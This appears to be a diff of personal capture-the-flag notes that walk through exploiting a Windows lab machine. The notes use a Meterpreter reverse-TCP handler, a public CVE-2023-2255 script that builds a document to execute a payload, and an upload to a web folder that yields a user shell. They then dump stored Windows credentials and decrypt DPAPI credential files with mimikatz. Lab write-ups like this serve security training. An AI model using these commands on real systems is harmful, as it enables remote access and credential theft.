@@ -435,7 +435,7 @@ https://github.com/elweth-sec/CVE-2023-2255
 
 downloading it 
 
-making 1 more payload via msfconsole -x "use exploits/multi/handler; set lhost tun0;set lport 4447 ;set payload windows/x64/meterpreter/reverse_tcp; exploit
+making 1 more payload via msfconsole -x "use exploits/multi/handler; set lhost tun0;set lport 4447 ;set payload windows/x64/meterpreter/reverse_tcp; exploit"
 
 now we need to create a RCE trigger using the CVE we downloaded:
     python3 CVE-2023-2255.py --cmd "C:\users\public\r47.exe"  
@@ -443,5 +443,38 @@ now we need to create a RCE trigger using the CVE we downloaded:
 
 now we need to upload it to machine as web_account to  C:\xampp\htdocs\internal\applications>
 
-still doesntwork --- 
+now wait and we get the ppotts shell
 
+after that we need to check the existing users with credentials:
+
+vaultcmd /listcreds:"Windows Credentials" /all
+vaultcmd /listcreds:"Windows Credentials" /all
+Credentials in vault: Windows Credentials
+
+Credential schema: Windows Domain Password Credential
+Resource: Domain:interactive=office\hhogan
+Identity: office\hhogan
+Hidden: No
+Roaming: No
+Property (schema element id,value): (100,3)
+
+now we need to exit to meterpreter shell and use:
+dir "%appdata%/Microsoft/Credentials"
+
+and we get some encryted files:
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  358   fil   2023-05-09 17:08:54 -0400  18A1927A997A794B65E9849883AC3F3E
+100666/rw-rw-rw-  398   fil   2023-05-09 19:03:21 -0400  84F1CAEEBF466550F4967858F9353FB4
+100666/rw-rw-rw-  374   fil   2024-01-18 14:53:30 -0500  E76CCA3670CD9BB98DF79E0A8D176F1E
+
+to decrypt it,we gonna need mimikatz
+
+creating a folder mimikatz in c:\Users\Public\
+
+uploading the mimikatz
+
+launching it with 
+
+dpapi::cred /in:"%appdata\microsoft\credentials\18A1927A997A794B65E9849883AC3F3E"
